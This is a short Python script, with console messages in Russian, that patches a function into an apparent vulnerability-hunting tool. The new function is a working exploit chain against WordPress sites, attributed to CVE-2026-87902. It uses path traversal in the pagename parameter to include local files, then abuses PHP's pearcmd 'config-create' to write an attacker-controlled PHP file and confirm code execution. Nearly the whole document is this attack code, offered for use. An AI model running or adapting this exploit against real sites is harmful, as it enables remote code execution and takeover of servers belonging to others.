import io, sys
P = r"C:\work\hunt2\core\vuln.py"
L = io.open(P, encoding="utf-8").read().split("\n")
i0 = next((i for i, l in enumerate(L) if l.startswith("def _wp_lfi(")), None)
i1 = next((i for i, l in enumerate(L) if l.startswith("def probe(")), None)
if i0 is None or i1 is None:
    print("границы _wp_lfi не найдены"); sys.exit(1)

new = '''def _wp_lfi(base, ex, marker):
    """CVE-2026-87902: pagename traversal -> template include -> PEAR write gadget."""
    try:
        hr = _req("GET", base + "/")
        html = getattr(hr, "text", "") or ""
    except Exception:
        return False, "lfi:no-home", ""
    base_len = len(html)
    themes = sorted(set(re.findall(r"/wp-content/themes/([a-z0-9._-]+)/", html)))
    if not themes:
        return False, "lfi:no-theme", ""
    theme = themes[0]

    pid = _find_page(base)
    if not pid:
        return False, "lfi:no-page", ""
    hdr = {"Content-Type": "application/x-www-form-urlencoded"}

    def post(pname):
        body = ("page_id=%d&pagename=%s" % (pid, _denc(pname))).encode()
        return _req("POST", base + "/", data=body, headers=hdr)

    good = []
    for td in ex.get("theme_dirs", ["page-templates"]):
        pre = td[5:] if td.startswith("page-") else td
        for depth in (4, 3, 5, 6, 7):
            p = pre + "/" + "../" * depth + "wp-content/themes/" + theme + "/404"
            try:
                r = post(p)
            except Exception:
                continue
            t = getattr(r, "text", "") or ""
            if t and abs(len(t) - base_len) > base_len * 0.2:
                good.append((td, depth))
                break
    if not good:
        return False, "lfi:no-dir " + theme, ""

    payload = "<?=" + _chrlit(marker) + "?>"
    out = ex.get("output", "/tmp/pbl") + _rnd(6)
    last = ""

    for td, depth in good:
        pre = td[5:] if td.startswith("page-") else td
        for inc in ex.get("includes", ["/usr/local/lib/php/pearcmd"]):
            incp = pre + "/" + "../" * depth + inc.lstrip("/")
            outp = pre + "/" + "../" * depth + out.lstrip("/")
            try:
                _req("POST", base + "/?+config-create+/" + payload + "+" + out + ".php",
                     data=("page_id=%d&pagename=%s" % (pid, _denc(incp))).encode(), headers=hdr)
                r = post(outp)
            except Exception as e:
                last = "lfi:" + type(e).__name__
                continue
            last = "lfi:%s depth %d %s" % (td, depth, inc)
            if marker in (getattr(r, "text", "") or ""):
                return True, last, base + "/"
    return False, last, ""

'''.split("\n")

L[i0:i1] = new
io.open(P, "w", encoding="utf-8", newline="\n").write("\n".join(L))
print("_wp_lfi переписан")